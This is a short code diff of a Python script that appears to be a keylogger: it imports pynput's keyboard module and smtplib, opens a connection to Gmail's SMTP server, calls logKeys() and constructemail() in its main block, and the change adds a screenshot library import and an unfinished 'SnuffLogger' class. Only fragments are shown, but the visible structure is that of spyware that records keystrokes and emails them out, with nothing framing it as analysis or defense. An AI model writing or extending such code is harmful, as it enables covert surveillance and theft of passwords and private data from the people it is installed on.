@@ -2,6 +2,7 @@ import smtplib
 import sys
 from email.message import EmailMessage
 from pynput import keyboard
+import pyscreenshot
 import os 
 
 smtp = smtplib.SMTP('smtp.gmail.com', 587)
@@ -56,3 +57,7 @@ def logKeys():
 if __name__ == "__main__":
     logKeys()
     constructemail()
+
+
+
+class SnuffLogger
